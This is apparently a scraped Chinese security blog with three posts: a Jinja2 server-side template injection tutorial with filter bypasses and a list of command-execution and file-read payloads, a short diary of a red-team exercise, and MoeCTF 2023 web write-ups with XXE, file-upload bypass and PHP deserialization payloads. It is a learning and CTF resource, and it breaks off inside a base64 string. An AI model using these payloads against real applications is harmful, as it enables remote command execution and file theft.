__base__和__bases__\n\n都是用于获取类的基类 基类也叫父类\n\n但是base是以字符串形式 而bases以元组的形式返回一个类所直接集成的类\n\n```python\n>>> \"\".__class__\n<class 'str'>\n>>> \"\".__class__.__base__\n<class 'object'>\n//object为str的基类\n>>>\"\".__class__.__bases__\n(<class 'object'>,)\n```\n\n## __mro__\n\n返回解析方法调用的顺序\n\n（当调用_mro_[1]或者-1时作用其实等同于_base_）\n\n```python\n>>> \"\".__class__.__mro__\n(<class 'str'>, <class 'object'>)\n>>> \"\".__class__.__mro__[1]\n<class 'object'>\n>>> \"\".__class__.__mro__[-1]\n<class 'object'>\n```\n\n## __subclasses__()\n\n获取类的所有子类\n\n这里需要知道object是所有类的基类\n\n所以object下子类是所有类\n\n```python\n>>>\"\".__class__.__base__.__subclasses__()\n可以获取到很多我们可以利用的类 然后通过[]索引下标来获取我们想要的类\n```\n\n## __init__\n\n所有可被当作模板导入的都包含__init__方法，通过此方法来调用__globals__方法\n\n## __globals__\n\n该方法会以字典的形式返回当前位置的所有全局变量\n\n所有函数都会有一个 __globals__ 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典\n\n## __builtins__\n\n### python2 中为__bulitins__和__bulitin__\n\n__builtins__ 实际上是一个指向或者说引用 __builtin__ 的（有点类似于软链接）\n\n这里 __builtins__ 是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。\n\n### python3中为__builtins__和builtins\n\n builtins 代替的 __builtin__\n\n在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 dir(__builtins__) 可以查到。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692343076146-0d66b0c5-04a0-4eb6-8136-666e07389d06.png)\n\n## __import__()\n\n该方法用于动态加载类和函数 如果一个模块经常变化就可以使用__import__()来动态载入 语法`__import__(模块名)`\n\n总体思路就是：\n\n```python\n找到父类<type 'object'> ---> 寻找子类 ---> 找关于命令执行或者文件操作的模块。\n```\n\n# 过滤器\n\n变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数\n\n可以链接多 个过滤器\n\n一个过滤器的输出应用于下一个过滤器。\n\n## attr()\n\n用于获取对象的属性\n\n```python\n\"\"|attr(\"__class__\")\n相当于\n\"\".__class__\n```\n\n常见于点号`.`被过滤，或者点号`.`和中括号`[]`都被过滤的情况\n\n## format()\n\n简单理解就是格式化字符\n\n```python\n\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)  #相当于__class__\n```\n\n## first() last() random()\n\n返回第一个值 最后一个值或者随机 \n\n随机的话需要我们跑个脚本就有几率获取到我们想要的内容了\n\n```python\n>>>\"\".__class__.__base__.__subclasses__()|first()\n<class 'type'>\n>>>\"\".__class__.__base__.__subclasses__()|last()\n<class 'jinja2.ext._CommentFinder'>\n>>>\"\".__class__.__base__.__subclasses__()|random()\n<class 'wrapper_descriptor'>\n```\n\n## join()\n\n字符串拼接\n\n```python\n\"\"[['__clas','s__']|join] 或者 \"\"[('__clas','s__')|join]\n相当于\n\"\"[\"__class__\"]\n```\n\n## lower()\n\n转化为小写\n\n```python\n>>>\"\"[\"__CLASS__\"|lower()]\n<class 'str'>\n```\n\n\n\n## replace() reverse()\n\n替换和反转还原回我们要用的字符串\n\n```python\n\"__claee__\"|replace(\"ee\",\"ss\") 构造出字符串 \"__class__\"\n\"__ssalc__\"|reverse 构造出 \"__class__\"\n```\n\n## string\n\n功能类似于python内置函数 str\n有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。\n\n```python\n>>>().__class__ \n<class 'tuple'>\n>>>(().__class__|string)[1] #注意这里要先()括起来然后再用下标调用\nc\n```\n\n## select\n\n和之前的结合起来有大作用\n\n```python\n>>>()|select|string\n<generator object select_or_reject at 0x7fc7678cdf90>\n```\n\n然后我们就可以切字符了\n\n```python\n(()|select|string)[24]~\n(()|select|string)[24]~\n(()|select|string)[15]~\n(()|select|string)[20]~\n(()|select|string)[6]~\n(()|select|string)[18]~\n(()|select|string)[18]~\n(()|select|string)[24]~\n(()|select|string)[24]\n\n得到字符串\"__class__\"\n```\n\n## list\n\n转换成列表\n\n更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了\n\n其实更多的是可以用list的函数了\n\n```python\n>>>()|select|string|list\n['<', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', 'c', '7', '6', '7', '8', 'c', 'd', 'f', '2', '0', '>']['<', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', 'c', '7', '6', '7', '8', 'c', 'd', 'f', '2', '0', '>']\n>>>(()|select|string|list)[1]\ng\n```\n\n# 变量\n\n除了标准的python语法使用点`.`外，还可以使用中括号`[]`来访问变量的属性\n\n```python\n{{\"\".__class__}}\n{{\"\"['__classs__']}}\n```\n\n## 拼接：\n\n```\n\"__cla\"+\"ss__\"`其实不用加中间的加号也可以 直接`\"__cla\"\"ss__\"\n```\n\n## 反转\n\n`\"__ssalc__\"[::-1]` 其实是python的切片\n\n## ascii转换\n\n```python\n\"{0:c}\".format(97)='a'\n\"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}\".format(95,95,99,108,97,115,115,95,95)='__class__'\n>>>\"\"[\"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}\".format(95,95,99,108,97,115,115,95,95)]\n<class 'str'>\n```\n\n## 编码绕过\n\n```python\n\\x5f\\x5fclass\\x5f\\x5f #16进制 __class__\n>>>\"\"[\"\\x5f\\x5fclass\\x5f\\x5f\"]\n<class 'str'>\n```\n\n\n\n## 在jinja2里面可以利用~进行拼接\n\n```python\n{%set a='__cla' %}{%set b='ss__'%}{{\"\"[a~b]}}\n```\n\n# SSTI语句构造\n\n## 首先就是要拿到当前类\n\n```python\n{{\"\".__class__}}\n或者\n{{().class}}\n```\n\n## 拿object\n\n也就是需要object然后再从它的子类中找我们可以利用的\n\n```python\n{{\"\".__class__.__mro__[1]}}\n{{\"\".__class__.__mro__[-1]}}\n\"\".__class__.__bases__[0]\n{{\"\".__class__.__base__}}\n```\n\n## 拿基类的子类\n\n用`__subclasses__()`获取子类\n\n大多数利用的是`os.wrap_close`这个类\n\n然后就是来找我们想要的内容 调教gpt帮我们写一个\n\n```python\ndef format_content(content):\n    lines = content.split(\",\")  # 以逗号为分隔符将内容拆分成行\n    formatted_lines = [f\"{i + 1}. {line.strip()}\" for i, line in enumerate(lines)]  # 为每一行添加序号\n    formatted_content = \"\\n\".join(formatted_lines)  # 将格式化后的行重新组合成字符串\n    return formatted_content\n\nfilename = \"content.txt\"\n\nwith open(filename, 'r') as file:\n    input_content = file.read()\n\nformatted_content = format_content(input_content)\nprint(\"格式化后的内容:\") #找到的序号需要-1 注意一下\nprint(formatted_content)\n```\n\n只要将前后的`[]`删去 然后放到content.txt就能自动帮我们标上序号了 然后序号要-1 因为脚本是从1开始的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349329941-cb5af00f-68ae-4fa1-90cb-496a1cedb40d.png)\n\n## __init__方法进行初始化类\n\n```python\n>>>{{\"\".__class__.__base__.__subclasses__()[132].__init__}}\n<function _wrap_close.__init__ at 0x7f2ee6fb25e0>\n```\n\n## 然后再调用__globals__获取到方法内以字典的形式返回的方法、属性\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349601730-0a12bdff-7cdb-44f9-a0b4-5db308ab3cc9.png)\n\n现在用命令执行函数或者模块就行了\n\n```python\n>>>{{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}}\n```\n\n有一个很厉害的模块是**buildtins**里面有eval()等函数可以用来rce\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349815755-69fb51d9-5140-4b90-9be5-72c61c2cd7e0.png)\n\n```python\n{{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat /flag').read()\")}}\n```\n\n# SSTI常见的绕过方式\n\n## 绕过.\n\n1. 前面也举了很多例子 可以用`[]`来代替\n\n```python\n{{\"\".__class__}}={{\"\"['__class']}}\n```\n\n1. 可以用attr()过滤器 \n\n```python\n{{\"\".__class__}}={{\"\"|attr('__class__')}}\n```\n\n## 绕过_\n\n1. 通过list获取字符列表，然后用pop来获取_ 其实就是去截_\n\n```python\n{% set a=(()|select|string|list).pop(24)%}{%print(a)%}\n```\n\n1. 通过十六进制编码 \n\n```python\n{{()[\"\\x5f\\x5fclass\\x5f\\x5f\"]}} ={{().__class__}}\n```\n\n## 绕过[]\n\n可以使用__getitem__魔术方法 简单说就是把中括号转换为括号\n\n```python\n__bases__[0]=__bases__.__getitem__(0)\n```\n\n其实本质是我们用[]的时候 调用的就是这个魔术方法而已\n\n## 绕过花括号\n\n可以用`{%%}`bypass 这时就要在里面用print()来打印结果了\n\n```python\n{{\"\".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('whoami').read()}}\n修改为\n{%print(\"\".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('whoami').read())%}\n```\n\n也可以借助for循环和if语句来执行命令\n\n```python\n{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__['popen']('whoami').read()%}{%endif%}{%endfor%}\n```\n\n注意这里循环语句 有`{%for}`就要有`{%endfor%}`\n\n有`{%if}` 就要有`{%endif%}`\n\n## 绕过单引号和双引号\n\n当单引号和双引号被ban时，我们通常采用`request.args.a`，然后给a赋值这种方式来进行绕过\n\n```python\n{{url_for.__globals__[request.args.a]}}&a=__builtins__  等同于 {{url_for.__globals__['__builtins__']}}\n```\n\n原理\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692353373357-ff1aea78-b318-4a51-b0ae-8ed11fcc5d7b.png)\n\n如果args也被禁了\n\n可以采用`request.cookies`和`request.values`，他们利用的方式大同小异\n\n```python\nGET:{{url_for.__globals__[request.cookies.a]}}\nCOOkie: \"a\" :'__builtins__'\n```\n\n## 绕过数字\n\n可以通过count来得到数字\n\n```python\n{{(dict(e=a)|join|count)}} #1\n{{(dict(eee=a)|join|count)}}#3\n```\n\n在这里join将字典的键连接起来 然后count\n\n## 绕过关键字\n\n和上面相同的原理 join拼接\n\n```python\n{{dict(__in=a,it__=a)|join}}  =__init__\n```\n\n# 常用payload\n\n```python\n1、任意命令执行\n{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__['popen']('dir').read()%}{%endif%}{%endfor%}\n2、任意命令执行\n{{\"\".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('cat /flag').read()}}\n//这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload\n3、任意命令执行\n{{url_for.__globals__['__builtins__']['eval'](\"__import__('os').popen('dir').read()\")}}\n4、任意命令执行\n{{x.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat flag').read()\")}}\n//x的含义是可以为任意字母，不仅仅限于x\n5、任意命令执行\n{{config.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat flag').read()\")}}\n6、文件读取\n{{x.__init__.__globals__['__builtins__'].open('/flag', 'r').read()}}\n//x的含义是可以为任意字母，不仅仅限于x\n```\n\n\n\n# 后言：\n\n做题慢慢补充\n\n参考：https://tttang.com/archive/1698/#toc__4 \n","categories":["知识学习"]},{"title":"第一次hwの经历","url":"/post/ccf2062.html","content":"\n突发恶疾\n\n<!--more-->\n\n暑假到一半突然说要回学校参加hw，一开始在去与不去的纠结中，但是由于学习的好奇心驱使和难得的机会，最后还是报了名，虽然五天陪跑，干的都是纯纯的体力活，但是总体还是很不错的一次学习经历！\n\n因为话题比较涉密，原谅没有图片的纯文字发病过程，请护眼。。。\n\n# 赛前\n\n因为突然来消息没有提前买机票，隔几天买机票的话就很贵，花了我整整1500/(ㄒoㄒ)/~~ 穷狗的眼泪落了下来\n\n然后就是回寝室，最恶心的是还要申请宿舍通水电，还要至少两个人在一个寝室，是牛魔脑子有病，都是成年人恶心人干嘛，好在是巧妙的化解了\n\n不知道咋了回来我的小电瓶车它不动了，太夸张了，我的爹他不动了，修车的人因为是假期也不在，很难想象我是怎么在大热天里徒步在校园中穿梭，那共享车的车速和位置真的是太让人逆天不想碰。\n\n总的一句话就是事事不顺。。。。 \n\n不过这些问题都不大\n\n# 被 ？围绕的五天\n\n开始三天吧估计是，毫无头绪，一开始就是照着网上教程去收集子域名，收集ip，很费劲，好在好像是第二天，发了资产表，终于是有点系统性整理好的信息了\n\n也是借着这次的hw，对于域名 子域名 ipc段 端口 fofa 宝塔等 有了更深的认识\n\n弱口令感觉经过多次hw之后，相较于之前的话，会少很多，这次我找到的都是未授权访问，相较于弱口令，这次未授权访问的洞是更多的。\n\n当然入口都是这些不起眼的小漏洞 但是就是因为这些小漏洞会引发一连串的效应  \n\n而且如果弱口令不是类似于admin/admin这样小白密码，那么要想通过社工管理员去针对的做一个密码本是比较困难和麻烦的。\n\n其次就是要对已经收集的一些资产信息进行整理和统计，这样可以避免重复性操作，也会使得整个流程进行的更有条理\n\n发力是在最后一天好像是找了三个未授权，然后其中一个里面有着40个摄像头美美的吃了一波分\n\n参加hw的师傅们都太强了，我们学校的👴们也很🐂，都是大佬，羡慕捏，能和厉害的人一起学习真的是一件很cool的事情\n\n其次还有意外的收获~\n\n# 结尾\n\n学习知识本就是个当孙子的过程，希望未来的自己也能够及时抓住机会，不要害怕失败吧，毕竟相比于成功在我身上失败总是来的更频繁些，但是能学到新东西，失败又如何呢。\n\nKeep Hacking！\n","categories":["感悟"]},{"title":"Moectf2023 WEB方向WP","url":"/post/a19b908f.html","content":"\n持续更新\n\n<!--more-->\n\n完善自己 新生赛都打不了一点\n\n这次靶机开启方式不错捏 挺新颖的\n\n# http\n\n正常请求参数考点 payload如下\n\n```plain\nPOST /?UwU=u HTTP/1.1\nHost: localhost:63279\nCache-Control: max-age=0\nsec-ch-ua: \nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: MoeBrowser\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: character=admin\nConnection: close\nX-Forwarded-For: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nLuv=u\n```\n\n# Web入门指北\n\npdf末尾有一串16进制码 转了就行\n\n# cookie\n\n随便注册个账号然后登录将cookie base64解码\n\n改成如下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180097881-982b5602-aebd-40ce-a215-5f243a2b1000.png)\n\n然后打入cookie 访问/flag 即可\n\n# 彼岸的flag\n\nF12 找就有\n\n# gas!gas!gas!\n\n看清规则\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180247032-9cbf0e31-ac5e-45b7-abcd-3d1fd538f4f2.png)\n\n油门和抓地成反比例 方向要反打 其次要在0.5秒进行下一步 直接脚本梭哈\n\n```python\nfrom requests import *\ns = session()\nurl = 'http://localhost:64026/'\npayload = {\"driver\":\"admin\",\"steering_control\":0,\"throttle\":1}\npayload_1 = {\"driver\":\"admin\",\"steering_control\":1,\"throttle\":0} #弯道向左，抓地力太小了！\npayload_2 = {\"driver\":\"admin\",\"steering_control\":-1,\"throttle\":0} #弯道向右，抓地力太小了！ \npayload_3 = {\"driver\":\"admin\",\"steering_control\":0,\"throttle\":1} #弯道直行，保持这个速度\npayload_4 = {\"driver\":\"admin\",\"steering_control\":1,\"throttle\":2} #弯道向左，抓地力太大了！\npayload_5 = {\"driver\":\"admin\",\"steering_control\":-1,\"throttle\":2}#弯道向右，抓地力太大了！\npayload_6 = {\"driver\":\"admin\",\"steering_control\":-1,\"throttle\":1} #弯道向右，保持这个速度 \npayload_7 = {\"driver\":\"admin\",\"steering_control\":1,\"throttle\":1} #弯道向左，保持这个速度\npayload_8 = {\"driver\":\"admin\",\"steering_control\":0,\"throttle\":2}#弯道直行，抓地力太大了！\npayload_9 = {\"driver\":\"admin\",\"steering_control\":0,\"throttle\":0}#弯道直行，抓地力太小了！\nr = s.post(url=url,data=payload)\nfor i in range(6):\n    if \"弯道向左，抓地力太小了！\" in r.text:\n        r = s.post(url=url,data=payload_1)\n    elif \"弯道向右，抓地力太小了！\" in r.text:\n        r = s.post(url=url,data=payload_2)\n    elif \"弯道直行，保持这个速度\" in r.text:\n        r = s.post(url=url,data=payload_3)\n    elif \"弯道向左，抓地力太大了！\" in r.text:\n        r = s.post(url=url,data=payload_4)\n    elif \"弯道向右，抓地力太大了！\" in r.text:\n        r = s.post(url=url,data=payload_5)\n    elif \"弯道向右，保持这个速度\" in r.text:\n        r = s.post(url=url,data=payload_6)\n    elif \"弯道向左，保持这个速度\" in r.text:\n        r = s.post(url=url,data=payload_7)\n    elif \"弯道直行，抓地力太大了！\" in r.text:\n        r = s.post(url=url,data=payload_8)\n    elif \"弯道直行，抓地力太小了！\" in r.text:\n        r = s.post(url=url,data=payload_9)\n\nprint(r.text)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180361902-326ff3a2-3884-4558-8c29-bb6430ad1ae4.png)\n\n# moe图床\n\n给了源码upload.php\n\n```python\n<?php\n$targetDir = 'uploads/';\n$allowedExtensions = ['png'];\n\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {\n    $file = $_FILES['file'];\n    $tmp_path = $_FILES['file']['tmp_name'];\n\n    if ($file['type'] !== 'image/png') {\n        die(json_encode(['success' => false, 'message' => '文件类型不符合要求']));\n    }\n\n    if (filesize($tmp_path) > 512 * 1024) {\n        die(json_encode(['success' => false, 'message' => '文件太大']));\n    }\n\n    $fileName = $file['name'];\n    $fileNameParts = explode('.', $fileName);\n\n    if (count($fileNameParts) >= 2) {\n        $secondSegment = $fileNameParts[1];\n        if ($secondSegment !== 'png') {\n            die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));\n        }\n    } else {\n        die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));\n    }\n\n    $uploadFilePath = dirname(__FILE__) . '/' . $targetDir . basename($file['name']);\n\n    if (move_uploaded_file($tmp_path, $uploadFilePath)) {\n        die(json_encode(['success' => true, 'file_path' => $uploadFilePath]));\n    } else {\n        die(json_encode(['success' => false, 'message' => '文件上传失败']));\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n这道题一开始没做出来 有点被吓住了 后来发现没啥\n\n比较重要的是这一块\n\n```python\n $fileName = $file['name'];\n    $fileNameParts = explode('.', $fileName);\n\n    if (count($fileNameParts) >= 2) {\n        $secondSegment = $fileNameParts[1];\n        if ($secondSegment !== 'png') {\n            die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));\n        }\n    } else {\n        die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));\n    }\n```\n\n然后其实我们将上传文件改为1.png.php即可 他只会检测索引为1的后缀是否为png\n\n可能是apache的文件名解析特性吧\n\n#  了解你的座驾\n\n一道xxe\n\npayload:\n\n```python\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE username [\n<!ENTITY aaa SYSTEM \"file:///flag\"> ]>\n<xml><name>&aaa;</name></xml>\n```\n\n值得注意的是要url编码后打入 不然没结果 \n\n\n\n# 大海捞针\n\n`?id=1`1-1000直接bp爆破就行了 \n\n# 大海捞针\n\n表面是文件上传其实就是文件包含 然后就是hash处理缺陷 数组绕过就行 经典题型了\n\n# 夺命十三枪\n\n一道反序列化字符串逃逸 nm新生赛做这个是吧\n\n给了源码:\n\n```python\n<?php\nhighlight_file(__FILE__);\n\nrequire_once('Hanxin.exe.php');\n\n$Chant = isset($_GET['chant']) ? $_GET['chant'] : '夺命十三枪';\n\n$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);\n\n$before = serialize($new_visitor);\n$after = Deadly_Thirteen_Spears::Make_a_Move($before);\necho 'Your Movements: ' . $after . '<br>';\n\ntry{\n    echo unserialize($after);\n}catch (Exception $e) {\n    echo \"Even Caused A Glitch...\";\n}\n?>\n<?php\n\nif (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {\n    highlight_file(__FILE__);\n}\n\nclass Deadly_Thirteen_Spears{\n    private static $Top_Secret_Long_Spear_Techniques_Manual = array(\n        \"di_yi_qiang\" => \"Lovesickness\",\n        \"di_er_qiang\" => \"Heartbreak\",\n        \"di_san_qiang\" => \"Blind_Dragon\",\n        \"di_si_qiang\" => \"Romantic_charm\",\n        \"di_wu_qiang\" => \"Peerless\",\n        \"di_liu_qiang\" => \"White_Dragon\",\n        \"di_qi_qiang\" => \"Penetrating_Gaze\",\n        \"di_ba_qiang\" => \"Kunpeng\",\n        \"di_jiu_qiang\" => \"Night_Parade_of_a_Hundred_Ghosts\",\n        \"di_shi_qiang\" => \"Overlord\",\n        \"di_shi_yi_qiang\" => \"Letting_Go\",\n        \"di_shi_er_qiang\" => \"Decisive_Victory\",\n        \"di_shi_san_qiang\" => \"Unrepentant_Lethality\"\n    );\n\n    public static function Make_a_Move($move){\n        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index => $movement){\n            $move = str_replace($index, $movement, $move);\n        }\n        return $move;\n    }\n}\n\nclass Omg_It_Is_So_Cool_Bring_Me_My_Flag{\n\n    public $Chant = '';\n    public $Spear_Owner = 'Nobody';\n\n    function __construct($chant){\n        $this->Chant = $chant;\n        $this->Spear_Owner = 'Nobody';\n    }\n\n    function __toString(){\n        if($this->Spear_Owner !== 'MaoLei'){\n            return 'Far away from COOL...';\n        }\n        else{\n            return \"Omg You're So COOOOOL!!! \" . getenv('FLAG');\n        }\n    }\n}\n\n?>\n```\n\n呢我们的最终目的就是最后一块\n\n```python\n function __toString(){\n        if($this->Spear_Owner !== 'MaoLei'){\n            return 'Far away from COOL...';\n        }\n        else{\n            return \"Omg You're So COOOOOL!!! \" . getenv('FLAG');\n        }\n    }\n}\n```\n\n但是我们只能get修改Chant值 不能修改Spear_Owner\n\n再看一眼有经典的先serialize 后unserialize 并且其中还有字符替换的 所以直接就能想到是反序列化字符串逃逸了\n\n需要将`\";s:11:\"Spear_Owner\";s:6:\"MaoLei\";}`一部分塞入一共35个\n\npayload如下\n\n```python\ndi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang\";s:11:\"Spear_Owner\";s:6:\"MaoLei\";}\n```\n\n \n\n# signin\n\n给了源码：\n\n有点糊涂 之后看看其他师傅的wp理解一下吧 \n\n前面的一些处理理解起来有点不懂\n\n```python\nfrom secrets import users, salt\nimport hashlib\nimport base64\nimport json\nimport http.server\n\nwith open(\"flag.txt\",\"r\") as f:\n    FLAG = f.read().strip()\n\ndef gethash(*items):\n    c = 0\n    for item in items:\n        if item is None:\n            continue\n        c ^= int.from_bytes(hashlib.md5(f\"{salt}[{item}]{salt}\".encode()).digest(), \"big\") # it looks so complex! but is it safe enough?\n    return hex(c)[2:]\n\nassert \"admin\" in users\nassert users[\"admin\"] == \"admin\"\n\nhashed_users = dict((k,gethash(k,v)) for k,v in users.items())\n\neval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,\"big\",signed=True).decode().translate({ord(c):None for c in \"\\x00\"})) # what is it?\n\ndef decrypt(data:str):\n    for x in range(5):\n        data = base64.b64encode(data).decode() # ummm...? It looks like it's just base64 encoding it 5 times? truely?\n    return data\n\n__page__ = base64.b64encode(\"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFt